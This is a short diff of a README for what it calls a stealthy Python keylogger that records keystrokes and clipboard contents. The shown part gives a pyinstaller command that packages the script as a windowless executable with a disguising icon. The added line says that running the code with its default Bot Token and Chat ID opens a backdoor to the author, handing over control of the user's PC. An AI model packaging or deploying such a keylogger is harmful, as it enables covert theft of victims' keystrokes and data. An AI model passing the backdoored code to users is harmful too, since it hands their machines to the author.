@@ -27,3 +27,4 @@ A stealthy Python-based keylogger that captures keyboard inputs, clipboard conte
 ```bash
 pyinstaller --onefile --noconsole --icon=myicon.ico your_script.pyw
 ```
+## NOTE: Usage of the code without changing the Bot Token and Chat ID will lead to a BackDoor which reaches me. Which means I am in control of your PC. Happy Hacking...
